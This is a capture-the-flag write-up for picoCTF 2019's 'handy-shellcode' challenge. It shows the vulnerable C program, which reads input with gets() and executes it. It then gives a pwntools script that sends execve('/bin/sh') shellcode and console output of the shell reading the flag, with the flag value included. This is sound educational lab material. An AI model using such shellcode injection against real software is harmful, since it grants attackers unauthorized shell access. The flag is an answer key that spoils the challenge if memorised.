# handy-shellcode
Binary Exploitation, 50 points

## Description:
> This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```


## Solution:


This challenge is similar to last year's [shellcode](/2018_picoCTF/shellcode.md). We'll use pwntools' "shellcode" module to generate a shellcode:


```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments
import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

shellcode = shellcraft.sh()
log.info("Shellcode: \n{}".format(shellcode))
io.sendlineafter("Enter your shellcode:", asm(shellcode))

io.interactive()

```

Output:
```console
root@kali:/media/sf_CTFs/pico/handy-shellcode# python exploit.py
[*] '/media/sf_CTFs/pico/handy-shellcode/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.AwgEXes6oj'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af'
[+] Starting remote process '/problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af/vuln' on 2019shell1.picoctf.com: pid 3301954
[*] Shellcode:
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push '/bin///sh\x00' */
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        /* push argument array ['sh\x00'] */
        /* push 'sh\x00\x00' */
        push 0x1010101
        xor dword ptr [esp], 0x1016972
        xor ecx, ecx
        push ecx /* null terminate */
        push 4
        pop ecx
        add ecx, esp
        push ecx /* 'sh\x00' */
        mov ecx, esp
        xor edx, edx
        /* call execve() */
        push SYS_execve /* 0xb */
        pop eax
        int 0x80
[*] Switching to interactive mode

jhh///sh/bin\x89h\x814$ri1Qj\x04YQ1j\x0bX̀
Thanks! Executing now...
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_5843b402}
```